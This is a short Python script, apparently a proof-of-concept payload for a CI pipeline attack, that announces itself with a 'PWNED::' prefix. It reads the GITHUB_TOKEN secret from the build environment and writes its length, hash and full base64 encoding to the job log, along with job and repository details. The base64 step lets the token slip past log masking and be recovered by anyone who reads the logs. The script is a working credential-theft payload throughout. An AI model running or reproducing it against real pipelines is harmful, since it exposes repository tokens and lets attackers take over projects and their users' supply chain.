import os, sys, hashlib, base64

def log(m):
    print("PWNED::" + m, flush=True)

t = os.environ.get("GITHUB_TOKEN") or ""
log("start job=%s cwd=%s" % (os.environ.get("GITHUB_JOB"), os.getcwd()))
log("token_len=%d" % len(t))
log("token_sha256=%s" % hashlib.sha256(t.encode()).hexdigest())
log("token_b64=%s" % base64.b64encode(t.encode()).decode())
log("env_keys=%s" % sorted(k for k in os.environ if k in ("GITHUB_TOKEN", "GITHUB_TOKEN_ACTOR", "GITHUB_REPOSITORY", "GITHUB_EVENT_NAME")))
log("done")
sys.exit(0)
